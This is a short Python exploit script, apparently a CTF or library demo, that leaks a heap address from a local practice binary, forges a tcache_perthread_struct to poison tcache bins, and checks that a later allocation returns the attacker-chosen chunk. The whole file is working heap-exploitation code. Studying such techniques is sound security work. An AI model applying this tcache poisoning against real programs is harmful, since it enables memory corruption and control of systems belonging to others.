#!/usr/bin/env python3

from flashlib import *

gdbscript = """
    b *main
"""

init("./tcache_perthread_struct_patched", aslr=False, gdbscript=gdbscript)
attach(gdbscript=gdbscript)

chunk1 = hexleak(io.recvafter(b"@ "))
heap   = chunk1 - 0x2a0
logleak(heap)

tc = tcache_perthread_struct()
tc[0x20]  = heap+0x2a0
tc[0x30]  = 0x4141414141414141
tc[0x410] = 0x4242424242424242

# This will set all chunks between 0x2f0 and 0x410 (inclusive) to point to heap+0x2a0
# tc.set_between(0x2f0, 0x410, [heap+0x2a0])
# tc.set_between(0x2f0, 0x410, p64(heap+0x2a0)) # works with bytes too

# Only get raw bytes until a specific tcache bin
# tc_bytes = tc.get_until(0x30)

io.sendlineafter(b": ", bytes(tc))

io.sendlineafter(b": ", encode(20))
chunk2 = hexleak(io.recvafter(b"@ "))
logleak(chunk2)

if chunk1 != chunk2:
    error("tcache poisoning failed!")

io.interactive()